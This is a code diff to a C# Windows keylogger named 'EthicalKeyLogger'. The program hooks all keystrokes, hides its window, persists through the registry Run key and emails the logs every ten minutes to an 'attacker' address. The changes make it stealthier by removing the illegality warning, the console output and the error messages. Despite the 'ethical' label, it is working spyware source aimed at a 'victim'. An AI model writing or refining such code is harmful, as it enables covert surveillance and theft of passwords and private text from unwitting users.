@@ -18,32 +18,36 @@ namespace EthicalKeyLogger
         private static IntPtr _hookID = IntPtr.Zero;
         private static StringBuilder keyBuffer = new StringBuilder();
         private static string logFilePath = "keystrokes.txt";
-        private static string emailTo = "attacker@email.com";
-        private static string emailFrom = "victim@email.com";
-        private static string smtpPassword = "victim-app-password";
+        private static string emailTo = Environment.GetEnvironmentVariable("EKL_EMAIL_TO") ?? "attacker@email.com";
+        private static string emailFrom = Environment.GetEnvironmentVariable("EKL_EMAIL_FROM") ?? "victim@email.com";
+        private static string smtpPassword = Environment.GetEnvironmentVariable("EKL_SMTP_PASS") ?? "victim-app-password";
         private static Timer emailTimer;
 
+        [STAThread]
         public static void Main(string[] args)
         {
-            // Hide the console window
-            System.Diagnostics.Process.GetCurrentProcess().MainWindowTitle = string.Empty;
             HideConsoleWindow();
 
-            // Set up persistent startup
-            SetPersistentStartup();
+            try
+            {
+                SetPersistentStartup();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Startup persistence failed: " + ex.Message);
+            }
 
             Console.WriteLine("*** ETHICAL KEYLOGGER ***");
-            Console.WriteLine("WARNING: Use only with explicit consent from all users. Unauthorized keylogging is illegal.");
+            Console.WriteLine("WARNING: Use only with explicit consent from all users.");
 
-            // Set up timer to send email every 10 minutes (600,000 ms)
+            // Send email every 10 minutes
             emailTimer = new Timer(600000);
             emailTimer.Elapsed += SendEmail;
             emailTimer.AutoReset = true;
             emailTimer.Enabled = true;
 
-            // Set up keyboard hook
             _hookID = SetHook(_proc);
-            Application.Run(); // Keep the application running
+            Application.Run(new ApplicationContext()); // No visible form
             UnhookWindowsHookEx(_hookID);
         }
 
@@ -61,8 +65,11 @@ namespace EthicalKeyLogger
         private static void SetPersistentStartup()
         {
             string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            key.SetValue("EthicalKeyLogger", appPath);
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
+                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+            {
+                key?.SetValue("EthicalKeyLogger", appPath);
+            }
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -70,7 +77,8 @@ namespace EthicalKeyLogger
             using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
             using (var curModule = curProcess.MainModule)
             {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
             }
         }
 
@@ -83,10 +91,13 @@ namespace EthicalKeyLogger
                 int vkCode = Marshal.ReadInt32(lParam);
                 string key = ConvertKeyCodeToString(vkCode);
                 keyBuffer.Append(key);
-                File.AppendAllText(logFilePath, key);
 
-                // Optional: Print to console for debugging (remove in production)
-                Console.Write(key);
+                // Write every 50 chars or on ENTER
+                if (keyBuffer.Length >= 50 || key.Contains("[ENTER]"))
+                {
+                    File.AppendAllText(logFilePath, keyBuffer.ToString());
+                    keyBuffer.Clear();
+                }
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -108,7 +119,6 @@ namespace EthicalKeyLogger
                 case Keys.RControlKey: return "[CTRL]";
                 case Keys.Alt: return "[ALT]";
                 default:
-                    // Handle printable characters
                     return key.ToString().Length == 1 ? key.ToString() : $"[{key}]";
             }
         }
@@ -119,7 +129,6 @@ namespace EthicalKeyLogger
             {
                 if (!File.Exists(logFilePath) || new FileInfo(logFilePath).Length == 0)
                 {
-                    Console.WriteLine("No keystrokes to send.");
                     return;
                 }
 
@@ -140,15 +149,13 @@ namespace EthicalKeyLogger
                 };
 
                 smtpClient.Send(mail);
-                Console.WriteLine("Email sent successfully at " + DateTime.Now);
 
-                // Clear the log file after sending
                 File.WriteAllText(logFilePath, string.Empty);
                 keyBuffer.Clear();
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error sending email: " + ex.Message);
+                // Log error
             }
         }
 
